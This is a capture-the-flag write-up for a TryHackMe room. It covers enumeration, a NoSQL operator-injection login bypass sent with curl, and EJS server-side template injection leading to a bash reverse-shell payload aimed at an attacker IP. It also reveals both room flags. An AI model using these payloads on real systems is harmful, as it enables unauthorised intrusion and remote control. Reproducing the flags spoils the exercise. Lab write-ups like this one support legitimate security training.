![Do Not Disturb Banner](https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251559871)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Cover.png" alt="Do Not Disturb Logo">
</p>

# <img src="https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251618019" alt="image" style="vertical-align: middle;height: 50px;" /> Do Not Disturb

This guide contains the answer and steps necessary to get to them for the [Do Not Disturb](https://tryhackme.com/room/hh-donotdisturb-84a45644) room.

## Table of contents

- [Table of contents](#table-of-contents)
  - [Task 2 - Hacker Holidays: Day 7](#task-2---hacker-holidays-day-7)

### Task 2 - Hacker Holidays: Day 7

1.  What is the user flag?

    Our first step is enumeration. We will use a few tools to find out more about the machine.

    ```console
    nmap -sV -sC 10.114.181.190
    ```

    ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Nmap.png)

    ```console
    gobuster dir -u http://10.114.181.190 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -t 20 
    ```

    ![Gobuster](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Gobuster.png)

    There seems to be a website that requires users to log in. I tried several SQL injection techniques. However, none work unfortunately.
    
    ```console
    attendent' OR '1'='1' --
    ```    
    
    ![Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Login.png)

    Something else we found using `gobuster`, is a 'staff' page which seems to give error 403.

    ![Staff](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Staff.png)

    In the description of the room they are talking about a warm session. Perhaps this means a session is still active/available.

    From our enumeration we have so far gathered a Node.js http server with Express. Something worth trying is bypassing the login altogether by using nested objects.

    ```console
    curl http://10.114.181.190/login -i -s -c cookies.txt --data 'username=attendant&password[$ne]=1'
    ```

    We want to display returned headers and save any cookies returned as well. We then POST a username and password to the form. In this case we try for any account named 'attendant' (as this was prefilled it was a good first try) were the password is not equal to '1'.

    ![Curl](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Curl.png)

    Success! Looks like we got returned a valid session cookie. 

    ![Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Cookie.png)

    Let us add this cookie named: "connect.sid" with the given value in a browser session.

    ![Session](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Session.png)

    After refreshing the page, we see we are logged in!

    ![Staff Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Staff_Login.png)

    In the form on this page, we are informed that we can use EJS templates to personalize messages. We can test to see if any string we add here indeed gets parsed as javascript or merely displayed as text. 

    ![Ssti](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Ssti.png)

    The equation was solved. Meaning we have a good change to get RCE using Sever-side-template-injection. Lets see if we get RCE through this using a simple command. 

    ![Rce](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Rce.png)

    Indeed it works! Now we should set up a reverse shell. We setup `netcat` and prepare our javascript reverse shell oneliner.

    ```console
    nc -nlvp 1337
    <%= process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/192.168.174.187/1337 0>&1"') %>
    ```

    ![Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Shell.png)

    And we are in! Now we can hunt for our first flag.

    

    ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_Flag.png)

    ><details><summary>Click for answer</summary>THM{w4rm_s3ss10n_h1j4ck3d}</details>

2.  What is the root flag?



    ><details><summary>Click for answer</summary>THM{r4w_d1sk_4cc3ss_w4s_t00_much}</details>

![](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-donotdisturb-84a45644/Do_Not_Disturb_.png)